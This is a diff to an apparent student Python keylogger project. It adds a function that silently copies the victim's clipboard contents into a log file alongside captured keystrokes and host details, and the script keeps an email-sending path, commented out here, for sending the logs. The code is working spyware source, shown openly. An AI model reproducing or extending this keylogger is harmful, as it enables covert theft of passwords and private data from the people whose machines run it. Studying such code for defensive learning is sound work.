@@ -35,6 +35,7 @@ password = os.getenv('EMAIL_PASSWORD')
 toaddr = os.getenv('TO_EMAIL_USER')
 key_information = "key_log.txt"
 system_information = "systeminfo.txt"
+clipboard_information = "clipboardinfo.txt"
 file_path = "/Users/rachittanwar/Documents/[02]/Coding/Cybersecurity/Python Keylogger/project"
 extend = "/"
 
@@ -84,6 +85,15 @@ def computer_information():
         f.write("Hostname: " + hostname + "\n")
         f.write("Private IP Address: " + IPAddr + "\n")
 
+def copy_clipboard():
+    with open(file_path + extend + clipboard_information, "a") as f:
+        try:
+            clip = pyperclip.paste()
+            clipboard_content = clip
+            f.write("Clipboard Data: \n" +clipboard_content)
+        except:
+            f.write("Clipboard cannot be copied")
+
 
 def on_press(key):
     global keys, count
@@ -119,4 +129,5 @@ with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 
 # send_email(key_information, file_path + extend + key_information, toaddr)
-computer_information()
+# computer_information()
+copy_clipboard()
